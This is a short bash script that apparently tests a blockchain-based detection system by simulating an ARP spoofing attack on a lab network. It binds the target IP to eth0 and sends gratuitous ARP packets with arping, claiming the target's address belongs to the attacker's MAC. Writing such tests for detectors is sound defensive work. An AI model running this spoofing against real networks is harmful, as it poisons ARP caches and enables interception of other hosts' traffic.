#!/bin/bash
# Simulate ARP spoofing attack

TARGET_IP=${1:-10.5.0.10}
ROUTER_IP=${2:-10.5.0.1}
ATTACKER_MAC=$(cat /sys/class/net/eth0/address 2>/dev/null || echo "unknown")

echo "============================================================"
echo "  ARP SPOOFING ATTACK SIMULATION"
echo "============================================================"
echo ""
echo "Target IP:  $TARGET_IP"
echo "Router IP:  $ROUTER_IP"
echo "Source MAC: $ATTACKER_MAC"
echo ""
echo "This will send a gratuitous ARP claiming:"
echo "  '$TARGET_IP is at $ATTACKER_MAC'"
echo ""
echo "The blockchain should detect this as spoofing."
echo ""

if ! command -v arping >/dev/null 2>&1; then
    echo "arping not found"
    exit 1
fi

if ! command -v ip >/dev/null 2>&1; then
    echo "ip command not found"
    exit 1
fi

cleanup() {
    ip addr del "$TARGET_IP/32" dev eth0 >/dev/null 2>&1 || true
}

echo "Sending spoofed ARP..."
ip addr add "$TARGET_IP/32" dev eth0 >/dev/null 2>&1 || true
trap cleanup EXIT
arping -U -c 3 -s "$TARGET_IP" -I eth0 "$ROUTER_IP"

echo ""
echo "Attack packets sent."
echo "Check the dashboard for spoofing detection alerts."
